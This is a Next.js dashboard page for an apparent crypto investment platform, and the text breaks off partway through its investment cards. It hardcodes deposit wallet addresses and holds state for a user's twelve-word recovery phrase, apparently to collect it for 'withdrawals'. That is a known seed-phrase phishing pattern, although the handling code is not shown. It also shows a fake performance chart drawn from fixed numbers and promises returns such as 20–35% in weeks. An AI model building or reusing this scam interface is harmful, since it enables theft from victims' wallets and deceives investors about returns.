"use client";

import { useState, useEffect } from "react";
import { useSession } from "next-auth/react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import Link from "next/link";
import { 
  FaChartLine, 
  FaWallet, 
  FaArrowUp, 
  FaUser, 
  FaCog, 
  FaPlus, 
  FaMinus,
  FaEye,
  FaEyeSlash,
  FaBitcoin,
  FaChartBar,

  FaDollarSign,
  FaCrown,
  FaShieldAlt,
  FaTimesCircle
} from 'react-icons/fa';

const cardVariants = {
  hidden: { opacity: 0, y: 40 },
  visible: { opacity: 1, y: 0, transition: { duration: 0.6 } }
};

// Real data will be fetched from API
interface PortfolioData {
  totalBalance: number;
  totalProfit: number;
  profitPercentage: number;
  totalDeposits: number;
  totalWithdrawals: number;
  activeInvestments: number;
  monthlyGrowth: number;
  riskScore: string;
  portfolioDiversity: number;
  totalInvested: number;
  totalCurrentValue: number;
}



interface Transaction {
  id: string;
  type: string;
  amount: number;
  date: string;
  status: string;
  description?: string;
  reference?: string;
}

// Default empty data
const defaultPortfolioData: PortfolioData = {
  totalBalance: 0,
  totalProfit: 0,
  profitPercentage: 0,
  totalDeposits: 0,
  totalWithdrawals: 0,
  activeInvestments: 0,
  monthlyGrowth: 0,
  riskScore: "Low",
  portfolioDiversity: 0,
  totalInvested: 0,
  totalCurrentValue: 0
};


const defaultTransactions: Transaction[] = [];

// Cryptocurrency wallet addresses (you can move these to .env file)
const cryptoWallets = {
  btc: {
    name: 'Bitcoin (BTC)',
    address: process.env.NEXT_PUBLIC_BTC_WALLET || 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    icon: '₿',
    color: 'text-yellow-500'
  },
  eth: {
    name: 'Ethereum (ETH)',
    address: process.env.NEXT_PUBLIC_ETH_WALLET || '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6',
    icon: 'Ξ',
    color: 'text-blue-500'
  },
  usdt: {
    name: 'Tether (USDT)',
    address: process.env.NEXT_PUBLIC_USDT_WALLET || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    icon: '₮',
    color: 'text-green-500'
  }
};

// Popular wallet apps for withdrawals
const popularWallets = [
  { id: 'metamask', name: 'MetaMask', description: 'Ethereum & EVM compatible', icon: '🦊' },
  { id: 'trustwallet', name: 'Trust Wallet', description: 'Multi-chain wallet', icon: '🛡️' },
  { id: 'exodus', name: 'Exodus', description: 'Desktop & mobile wallet', icon: '📱' },
  { id: 'coinbase', name: 'Coinbase Wallet', description: 'Exchange wallet', icon: '🔵' },
  { id: 'binance', name: 'Binance Wallet', description: 'Exchange wallet', icon: '🟡' },
  { id: 'phantom', name: 'Phantom', description: 'Solana wallet', icon: '👻' },
  { id: 'ledger', name: 'Ledger', description: 'Hardware wallet', icon: '🔒' },
  { id: 'trezor', name: 'Trezor', description: 'Hardware wallet', icon: '🔐' },
  { id: 'atomic', name: 'Atomic Wallet', description: 'Multi-coin wallet', icon: '⚛️' },
  { id: 'guarda', name: 'Guarda Wallet', description: 'Multi-platform wallet', icon: '🛡️' },
  { id: 'jaxx', name: 'Jaxx Liberty', description: 'Multi-platform wallet', icon: '🔄' },
  { id: 'myetherwallet', name: 'MyEtherWallet', description: 'Web-based wallet', icon: '🌐' },
  { id: 'imtoken', name: 'imToken', description: 'Mobile wallet', icon: '📱' },
  { id: 'safepal', name: 'SafePal', description: 'Hardware wallet', icon: '🛡️' },
  { id: 'mathwallet', name: 'Math Wallet', description: 'Multi-chain wallet', icon: '🧮' },
  { id: 'tokenpocket', name: 'TokenPocket', description: 'Multi-chain wallet', icon: '💼' },
  { id: 'walletconnect', name: 'WalletConnect', description: 'Connection protocol', icon: '🔗' },
  { id: 'rainbow', name: 'Rainbow', description: 'Ethereum wallet', icon: '🌈' },
  { id: 'argent', name: 'Argent', description: 'Smart contract wallet', icon: '🪙' },
  { id: 'gnosis', name: 'Gnosis Safe', description: 'Multi-sig wallet', icon: '🛡️' },
  { id: 'other', name: 'Other Wallet', description: 'Specify in notes', icon: '📝' }
];

// Simple chart component
const SimpleChart = ({ data, height = 200 }: { data: number[], height?: number }) => {
  try {
    // Safety checks for data
    if (!data || !Array.isArray(data) || data.length === 0) {
      return (
        <div className="flex items-center justify-center h-full text-[var(--foreground)]/40">
          <div className="text-center">
            <div className="text-lg mb-2">No Data</div>
            <div className="text-sm">Chart data unavailable</div>
          </div>
        </div>
      );
    }

    const maxValue = Math.max(...data);
    const minValue = Math.min(...data);
    const range = maxValue - minValue;
    
    // Prevent division by zero
    if (range === 0) {
      return (
        <div className="flex items-center justify-center h-full text-[var(--foreground)]/40">
          <div className="text-center">
            <div className="text-lg mb-2">Flat Line</div>
            <div className="text-sm">No variation in data</div>
          </div>
        </div>
      );
    }
    
    return (
      <div className="relative" style={{ height }}>
        <svg width="100%" height="100%" className="overflow-visible">
          <defs>
            <linearGradient id="chartGradient" x1="0%" y1="0%" x2="0%" y2="100%">
              <stop offset="0%" stopColor="var(--brand)" stopOpacity="0.8" />
              <stop offset="100%" stopColor="var(--brand)" stopOpacity="0.2" />
            </linearGradient>
          </defs>
          <path
            d={data.map((value, index) => {
              const x = (index / (data.length - 1)) * 100;
              const y = 100 - ((value - minValue) / range) * 100;
              return `${index === 0 ? 'M' : 'L'} ${x}% ${y}%`;
            }).join(' ')}
            stroke="var(--brand)"
            strokeWidth="3"
            fill="none"
            className="drop-shadow-lg"
          />
          <path
            d={data.map((value, index) => {
              const x = (index / (data.length - 1)) * 100;
              const y = 100 - ((value - minValue) / range) * 100;
              return `${index === 0 ? 'M' : 'L'} ${x}% ${y}%`;
            }).join(' ') + ` L 100% 100% L 0% 100% Z`}
            fill="url(#chartGradient)"
            opacity="0.3"
          />
        </svg>
      </div>
    );
  } catch (error) {
    console.error('Error rendering SimpleChart:', error);
    return (
      <div className="flex items-center justify-center h-full text-[var(--foreground)]/40">
        <div className="text-center">
          <div className="text-lg mb-2">Chart Error</div>
          <div className="text-sm">Failed to render chart</div>
        </div>
      </div>
    );
  }
};

export default function Dashboard() {
  const { data: session, status } = useSession();
  const router = useRouter();
  const [showBalance, setShowBalance] = useState(true);
  const [activeTab, setActiveTab] = useState("overview");
  const [portfolioData, setPortfolioData] = useState<PortfolioData>(defaultPortfolioData);

  const [transactions, setTransactions] = useState<Transaction[]>(defaultTransactions);
  const [loading, setLoading] = useState(true);
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const [showDepositModal, setShowDepositModal] = useState(false);
  const [showWithdrawalModal, setShowWithdrawalModal] = useState(false);
  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawalAmount, setWithdrawalAmount] = useState('');
  const [selectedCrypto, setSelectedCrypto] = useState('btc');
  const [withdrawalWalletType, setWithdrawalWalletType] = useState('');
  const [twelveWordPhrase, setTwelveWordPhrase] = useState(['', '', '', '', '', '', '', '', '', '', '', '']);

  // Function to fetch real user data
  const fetchUserData = async () => {
    try {
      console.log('🔍 [USER DASHBOARD] Fetching user data...');
      setLoading(true);
      
      const response = await fetch('/api/user/investments', {
        method: 'GET',
        headers: {
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        console.log('✅ [USER DASHBOARD] User data fetched:', data);
        
        // Ensure portfolio data has all required fields with fallbacks
        const safePortfolioData = {
          totalBalance: data.portfolio?.totalBalance || 0,
          totalProfit: data.portfolio?.totalProfit || 0,
          profitPercentage: data.portfolio?.profitPercentage || 0,
          totalDeposits: data.portfolio?.totalDeposits || 0,
          totalWithdrawals: data.portfolio?.totalWithdrawals || 0,
          activeInvestments: data.portfolio?.activeInvestments || 0,
          monthlyGrowth: data.portfolio?.monthlyGrowth || 0,
          riskScore: data.portfolio?.riskScore || "Low",
          portfolioDiversity: data.portfolio?.portfolioDiversity || 0,
          totalInvested: data.portfolio?.totalInvested || 0,
          totalCurrentValue: data.portfolio?.totalCurrentValue || 0
        };
        
        setPortfolioData(safePortfolioData);
        setLastUpdated(new Date());
        
        // Fetch real transactions from database
        try {
          const transactionsResponse = await fetch('/api/user/transactions', {
            method: 'GET',
            headers: {
              'Cache-Control': 'no-cache',
              'Pragma': 'no-cache'
            }
          });
          
          if (transactionsResponse.ok) {
            const transactionsData = await transactionsResponse.json();
            console.log('✅ [USER DASHBOARD] Transactions fetched:', transactionsData);
            
            if (transactionsData.transactions && transactionsData.transactions.length > 0) {
              // Transform database transactions to match the interface
              const realTransactions: Transaction[] = transactionsData.transactions.map((t: {
                _id?: string;
                id?: string;
                type?: string;
                amount?: number;
                description?: string;
                status?: string;
                createdAt?: string | Date;
                reference?: string;
              }) => ({
                id: t._id || t.id || Math.random().toString(36).substr(2, 9),
                type: t.type || 'unknown',
                amount: t.amount || 0,
                date: t.createdAt || new Date().toISOString(),
                status: t.status || 'pending',
                description: t.description || '',
                reference: t.reference || ''
              }));
              setTransactions(realTransactions);
            } else {
              // No transactions found, set empty array
              setTransactions([]);
            }
          } else {
            console.log('ℹ️ [USER DASHBOARD] No transactions found or error fetching transactions');
            setTransactions([]);
          }
        } catch (transactionError) {
          console.log('ℹ️ [USER DASHBOARD] Error fetching transactions, setting empty array:', transactionError);
          setTransactions([]);
        }
        
      } else {
        console.error('❌ [USER DASHBOARD] Failed to fetch user data:', response.status);
      }
    } catch (error) {
      console.error('❌ [USER DASHBOARD] Error fetching user data:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (status === "unauthenticated") {
      router.push("/login");
    } else if (status === "authenticated") {
      // Fetch real data when user is authenticated
      fetchUserData();
      
      // Set up auto-refresh every 30 seconds
      const interval = setInterval(() => {
        console.log('🔄 [USER DASHBOARD] Auto-refreshing data...');
        fetchUserData();
      }, 30000); // 30 seconds
      
      // Cleanup interval on unmount
      return () => {
        if (interval) {
          clearInterval(interval);
        }
      };
    }
  }, [status]); // eslint-disable-line react-hooks/exhaustive-deps

  if (status === "loading") {
    return (
      <div className="min-h-screen bg-[var(--background)] flex items-center justify-center">
        <div className="w-16 h-16 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin" />
      </div>
    );
  }

  if (!session || !session.user) {
    return (
      <div className="min-h-screen bg-[var(--background)] flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin mx-auto mb-4" />
          <div className="text-[var(--foreground)]/60">Loading session...</div>
        </div>
      </div>
    );
  }

  const formatCurrency = (amount: number) => {
    try {
      if (amount === null || amount === undefined || isNaN(amount)) {
        return '$0.00';
      }
      
      return new Intl.NumberFormat('en-US', {
        style: 'currency',
        currency: 'USD',
      }).format(amount);
    } catch (error) {
      console.error('Error formatting currency:', error, amount);
      return '$0.00';
    }
  };

  const formatDate = (dateString: string) => {
    try {
      if (!dateString) return 'N/A';
      const date = new Date(dateString);
      if (isNaN(date.getTime())) return 'Invalid Date';
      
      return date.toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'short',
        day: 'numeric'
      });
    } catch (error) {
      console.error('Error formatting date:', error, dateString);
      return 'Invalid Date';
    }
  };



  // Chart data for portfolio performance
  const chartData = [100, 105, 98, 112, 108, 115, 120, 118, 125, 130, 128, 132];

  // Ensure all data is safely initialized
  const safeChartData = chartData || [100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100];

  return (
    <main className="min-h-screen bg-[var(--background)] text-[var(--foreground)] pt-20">
      {/* Header */}
      <header className="bg-[var(--card-bg)] border-b border-[var(--brand)]/20 px-4 py-4">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
          <h1 className="text-xl sm:text-2xl font-bold text-[var(--foreground)]">Dashboard</h1>
          
          <div className="flex items-center gap-2 sm:gap-4 w-full sm:w-auto">
            <button
              onClick={fetchUserData}
              disabled={loading}
              className="px-3 py-1 bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white text-sm rounded-lg transition-colors flex items-center gap-2 disabled:opacity-50"
            >
              {loading ? (
                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <FaArrowUp size={14} />
              )}
              Refresh
            </button>
            
            {lastUpdated && (
              <div className="text-xs text-[var(--foreground)]/40">
                Last updated: {lastUpdated.toLocaleTimeString()}
              </div>
            )}
            
            <div className="flex items-center gap-2 text-sm text-[var(--foreground)]/60">
              <FaUser size={16} />
              <span className="hidden sm:inline">{session.user?.name || 'User'}</span>
            </div>
            {session.user?.role === 'admin' && (
              <Link
                href="/admin"
                className="px-3 sm:px-4 py-2 bg-yellow-600 hover:bg-yellow-700 text-white rounded-lg flex items-center gap-2 transition-colors text-sm"
              >
                <FaCrown size={16} />
                <span className="hidden sm:inline">Admin Panel</span>
                <span className="sm:hidden">Admin</span>
              </Link>
            )}
            <button
              onClick={() => setShowBalance(!showBalance)}
              className="p-2 text-[var(--foreground)]/60 hover:text-[var(--foreground)] transition-colors"
              title={showBalance ? "Hide Balance" : "Show Balance"}
            >
              {showBalance ? <FaEye size={16} /> : <FaEyeSlash size={16} />}
            </button>
          </div>
        </div>
      </header>

      {/* Navigation Tabs */}
      <nav className="bg-[var(--card-bg)] border-b border-[var(--brand)]/20 px-4">
        <div className="max-w-7xl mx-auto">
          <div className="flex overflow-x-auto space-x-8 pb-2">
            {[
              { id: "overview", label: "Overview", icon: FaChartLine },
              { id: "investments", label: "Investments", icon: FaWallet },
              { id: "transactions", label: "Transactions", icon: FaArrowUp },
              { id: "analytics", label: "Analytics", icon: FaChartBar },
              ...(session.user?.role === 'admin' ? [{ id: "admin", label: "Admin", icon: FaCrown }] : []),
              { id: "settings", label: "Settings", icon: FaCog }
            ].map((tab) => {
              const Icon = tab.icon;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`flex items-center gap-2 py-4 px-3 border-b-2 font-medium text-sm transition-colors whitespace-nowrap ${
                    activeTab === tab.id
                      ? "border-[var(--brand)] text-[var(--brand)]"
                      : "border-transparent text-[var(--foreground)]/60 hover:text-[var(--foreground)]/80"
                  }`}
                >
                  <Icon size={16} />
                  <span className="hidden sm:inline">{tab.label}</span>
                </button>
              );
            })}
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-3 sm:px-4 py-6 sm:py-8">
        {activeTab === "overview" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-8"
          >
            {loading ? (
              <div className="flex items-center justify-center py-12">
                <div className="w-8 h-8 border-4 border-[var(--brand)]/30 border-t-[var(--brand)] rounded-full animate-spin"></div>
                <span className="ml-3 text-[var(--foreground)]/60">Loading portfolio data...</span>
              </div>
            ) : (
              <>
                {/* Portfolio Summary Cards */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
              <motion.div
                variants={cardVariants}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Total Balance</h3>
                  <FaWallet className="text-[var(--brand)]" size={20} />
                </div>
                <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
                  {showBalance ? formatCurrency(portfolioData.totalBalance) : "****"}
                </div>
                <div className="flex items-center gap-2 text-sm">
                  <FaArrowUp className="text-green-500" size={12} />
                  <span className="text-green-500">+{portfolioData.monthlyGrowth}%</span>
                  <span className="text-[var(--foreground)]/60">this month</span>
                </div>
              </motion.div>

              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.1 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Total Profit</h3>
                  <FaArrowUp className="text-green-500" size={20} />
                </div>
                <div className="text-2xl font-bold text-green-500 mb-2">
                  {showBalance ? formatCurrency(portfolioData.totalProfit) : "****"}
                </div>
                <div className="text-sm text-[var(--foreground)]/60">
                  +{portfolioData.profitPercentage}% since joining
                </div>
              </motion.div>

              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.2 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Active Investments</h3>
                  <FaChartLine className="text-[var(--brand)]" size={20} />
                </div>
                <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
                  {portfolioData.activeInvestments}
                </div>
                <div className="text-sm text-[var(--foreground)]/60">
                  {portfolioData.portfolioDiversity}% diversified
                </div>
              </motion.div>

              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.3 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[var(--foreground)]/60 text-sm font-medium">Risk Score</h3>
                  <FaArrowUp className="text-[var(--brand)]" size={20} />
                </div>
                <div className="text-2xl font-bold text-[var(--foreground)] mb-2">
                  {portfolioData.riskScore}
                </div>
                <div className="text-sm text-[var(--foreground)]/60">
                  Conservative strategy
                </div>
              </motion.div>
            </div>

            {/* Investment Performance Chart */}
            <motion.div
              variants={cardVariants}
              transition={{ delay: 0.4 }}
              className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6"
            >
              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between mb-6 gap-4">
                <h3 className="text-lg sm:text-xl font-bold text-[var(--foreground)]">Portfolio Performance</h3>
                <div className="flex items-center gap-4 text-sm">
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-[var(--brand)] rounded-full"></div>
                    <span className="text-[var(--foreground)]/60">Portfolio Value</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                    <span className="text-[var(--foreground)]/60">Growth Trend</span>
                  </div>
                </div>
              </div>
              <div className="h-64">
                <SimpleChart data={safeChartData} height={256} />
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mt-6 text-center">
                <div>
                  <div className="text-xl sm:text-2xl font-bold text-green-500">+{portfolioData.monthlyGrowth}%</div>
                  <div className="text-sm text-[var(--foreground)]/60">This Month</div>
                </div>
                <div>
                  <div className="text-xl sm:text-2xl font-bold text-[var(--foreground)]">{portfolioData.profitPercentage}%</div>
                  <div className="text-sm text-[var(--foreground)]/60">Total Return</div>
                </div>
                <div>
                  <div className="text-xl sm:text-2xl font-bold text-[var(--brand)]">{portfolioData.portfolioDiversity}%</div>
                  <div className="text-sm text-[var(--foreground)]/60">Diversification</div>
                </div>
              </div>
              
              {/* Action Buttons */}
              <div className="flex flex-col sm:flex-row gap-4 mt-6 justify-center">
                <button
                  onClick={() => setShowDepositModal(true)}
                  className="px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg flex items-center gap-2 transition-colors font-medium"
                >
                  <FaPlus size={16} />
                  Deposit Funds
                </button>
                <button
                  onClick={() => setShowWithdrawalModal(true)}
                  className="px-6 py-3 bg-red-600 hover:bg-red-700 text-white rounded-lg flex items-center gap-2 transition-colors font-medium"
                >
                  <FaMinus size={16} />
                  Withdraw Funds
                </button>
              </div>
            </motion.div>

            {/* Quick Actions */}
            <motion.div
              variants={cardVariants}
              transition={{ delay: 0.5 }}
              className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6"
            >
              <h3 className="text-xl font-bold text-[var(--foreground)] mb-6">Quick Actions</h3>
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                <button className="bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white p-4 rounded-lg flex items-center gap-3 transition-colors">
                  <FaChartLine size={20} />
                  <span>View Analytics</span>
                </button>
                <button 
                  onClick={() => setShowDepositModal(true)}
                  className="bg-green-600 hover:bg-green-700 text-white p-4 rounded-lg flex items-center gap-3 transition-colors"
                >
                  <FaArrowUp size={20} />
                  <span>Deposit Funds</span>
                </button>
                <button className="bg-[var(--card-bg)] border border-[var(--brand)]/20 hover:bg-[var(--brand)]/10 text-[var(--foreground)] p-4 rounded-lg flex items-center gap-3 transition-colors">
                  <FaChartLine size={20} />
                  <span>View Analytics</span>
                </button>
              </div>
            </motion.div>
              </>
            )}
          </motion.div>
        )}

        {activeTab === "investments" && (
          <motion.div
            initial="hidden"
            animate="visible"
            variants={cardVariants}
            className="space-y-6"
          >
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
              <h2 className="text-xl sm:text-2xl font-bold text-[var(--foreground)]">Investment Options</h2>
              <div className="text-sm text-[var(--foreground)]/60">
                Choose from our available investment opportunities
              </div>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 sm:gap-6">
              {/* Crypto Investment Option */}
              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.1 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <FaBitcoin className="text-yellow-500" size={24} />
                    <div>
                      <h3 className="font-bold text-[var(--foreground)]">Crypto Trading</h3>
                      <p className="text-sm text-[var(--foreground)]/60">Cryptocurrency</p>
                    </div>
                  </div>
                  <div className="bg-green-500/20 text-green-500 px-3 py-1 rounded-full text-xs font-medium">
                    Available
                  </div>
                </div>
                
                <div className="space-y-3 mb-4">
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Min Investment:</span>
                    <span className="font-semibold">$100</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Expected Return:</span>
                    <span className="font-semibold text-green-500">15-25%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Duration:</span>
                    <span className="font-semibold">30-90 days</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Risk Level:</span>
                    <span className="font-semibold text-yellow-500">Medium</span>
                  </div>
                </div>
                
                <div className="bg-[var(--background)]/50 p-3 rounded-lg mb-4">
                  <p className="text-sm text-[var(--foreground)]/70">
                    Trade Bitcoin, Ethereum, and other cryptocurrencies with professional strategies
                  </p>
                </div>
                
                <button className="w-full bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white py-2 rounded-lg transition-colors font-medium">
                  Learn More
                </button>
              </motion.div>

              {/* Stocks Investment Option */}
              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.2 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <FaChartBar className="text-blue-500" size={24} />
                    <div>
                      <h3 className="font-bold text-[var(--foreground)]">Stock Portfolio</h3>
                      <p className="text-sm text-[var(--foreground)]/60">Equities</p>
                    </div>
                  </div>
                  <div className="bg-green-500/20 text-green-500 px-3 py-1 rounded-full text-xs font-medium">
                    Available
                  </div>
                </div>
                
                <div className="space-y-3 mb-4">
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Min Investment:</span>
                    <span className="font-semibold">$500</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Expected Return:</span>
                    <span className="font-semibold text-green-500">8-15%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Duration:</span>
                    <span className="font-semibold">6-24 months</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Risk Level:</span>
                    <span className="font-semibold text-green-500">Low-Medium</span>
                  </div>
                </div>
                
                <div className="bg-[var(--background)]/50 p-3 rounded-lg mb-4">
                  <p className="text-sm text-[var(--foreground)]/70">
                    Diversified portfolio of blue-chip stocks and growth companies
                  </p>
                </div>
                
                <button className="w-full bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white py-2 rounded-lg transition-colors font-medium">
                  Learn More
                </button>
              </motion.div>

              {/* Real Estate Investment Option */}
              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.3 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <FaChartLine className="text-green-500" size={24} />
                    <div>
                      <h3 className="font-bold text-[var(--foreground)]">Real Estate Fund</h3>
                      <p className="text-sm text-[var(--foreground)]/60">Property</p>
                    </div>
                  </div>
                  <div className="bg-green-500/20 text-green-500 px-3 py-1 rounded-full text-xs font-medium">
                    Available
                  </div>
                </div>
                
                <div className="space-y-3 mb-4">
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Min Investment:</span>
                    <span className="font-semibold">$1,000</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Expected Return:</span>
                    <span className="font-semibold text-green-500">12-18%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Duration:</span>
                    <span className="font-semibold">12-36 months</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Risk Level:</span>
                    <span className="font-semibold text-green-500">Low</span>
                  </div>
                </div>
                
                <div className="bg-[var(--background)]/50 p-3 rounded-lg mb-4">
                  <p className="text-sm text-[var(--foreground)]/70">
                    Invest in residential and commercial real estate properties
                  </p>
                </div>
                
                <button className="w-full bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white py-2 rounded-lg transition-colors font-medium">
                  Learn More
                </button>
              </motion.div>

              {/* Forex Investment Option */}
              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.4 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <FaDollarSign className="text-purple-500" size={24} />
                    <div>
                      <h3 className="font-bold text-[var(--foreground)]">Forex Trading</h3>
                      <p className="text-sm text-[var(--foreground)]/60">Currency</p>
                    </div>
                  </div>
                  <div className="bg-green-500/20 text-green-500 px-3 py-1 rounded-full text-xs font-medium">
                    Available
                  </div>
                </div>
                
                <div className="space-y-3 mb-4">
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Min Investment:</span>
                    <span className="font-semibold">$200</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Expected Return:</span>
                    <span className="font-semibold text-green-500">20-35%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Duration:</span>
                    <span className="font-semibold">7-30 days</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Risk Level:</span>
                    <span className="font-semibold text-red-500">High</span>
                  </div>
                </div>
                
                <div className="bg-[var(--background)]/50 p-3 rounded-lg mb-4">
                  <p className="text-sm text-[var(--foreground)]/70">
                    Trade major currency pairs with leverage and advanced strategies
                  </p>
                </div>
                
                <button className="w-full bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white py-2 rounded-lg transition-colors font-medium">
                  Learn More
                </button>
              </motion.div>

              {/* Commodities Investment Option */}
              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.5 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <FaChartBar className="text-orange-500" size={24} />
                    <div>
                      <h3 className="font-bold text-[var(--foreground)]">Commodities</h3>
                      <p className="text-sm text-[var(--foreground)]/60">Gold, Oil, etc.</p>
                    </div>
                  </div>
                  <div className="bg-green-500/20 text-green-500 px-3 py-1 rounded-full text-xs font-medium">
                    Available
                  </div>
                </div>
                
                <div className="space-y-3 mb-4">
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Min Investment:</span>
                    <span className="font-semibold">$300</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Expected Return:</span>
                    <span className="font-semibold text-green-500">10-20%</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Duration:</span>
                    <span className="font-semibold">3-12 months</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-[var(--foreground)]/60">Risk Level:</span>
                    <span className="font-semibold text-yellow-500">Medium</span>
                  </div>
                </div>
                
                <div className="bg-[var(--background)]/50 p-3 rounded-lg mb-4">
                  <p className="text-sm text-[var(--foreground)]/70">
                    Invest in precious metals, energy, and agricultural commodities
                  </p>
                </div>
                
                <button className="w-full bg-[var(--brand)] hover:bg-[var(--brand)]/80 text-white py-2 rounded-lg transition-colors font-medium">
                  Learn More
                </button>
              </motion.div>

              {/* Fixed Income Investment Option */}
              <motion.div
                variants={cardVariants}
                transition={{ delay: 0.6 }}
                className="bg-[var(--card-bg)] border border-[var(--brand)]/20 rounded-xl shadow-xl p-6 hover:shadow-2xl transition-all duration-300"
              >
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <FaShieldAlt className="text-blue-600" size={24} />
                    <div>
                      <h3 className="font-bold text-[var(--foreground)]">Fixed Income</h3>
                      <p className="text-sm text-[var(--foreground)]/60">Bonds & CDs</p>
